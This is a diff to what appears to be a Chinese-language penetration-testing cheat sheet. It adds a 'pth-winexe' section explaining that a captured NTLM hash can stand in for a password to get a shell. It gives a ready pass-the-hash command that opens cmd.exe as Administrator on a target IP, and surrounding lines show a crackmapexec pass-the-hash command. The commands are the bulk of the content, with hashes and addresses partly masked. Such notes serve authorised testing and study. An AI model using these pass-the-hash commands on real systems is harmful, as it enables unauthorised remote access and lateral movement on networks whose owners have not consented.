@@ -58,6 +58,15 @@ crackmapexec smb 192.168.xxx.xx -u admin -H D9F67574879GDL33..........676FD --mi
 # 仅以smb模块举例，还有其他模块
 ```
 
+### pth-winexe
+
+* 当找到了目标账户的NTLM哈希之后，可以将其当成密码来使用，绕过输入明文密码来进行身份验证，从而获取到shell：
+
+```bash
+# pth-winexe -U [域名/用户名]%[hash] //[目标IP] cmd.exe
+pth-winexe -U Administrator%00000000000000000000000000000000:32196B56FF.........3BF38 //192.168.xxx.xxx cmd.exe
+```
+
 ### Metasploit
 
 ```bash
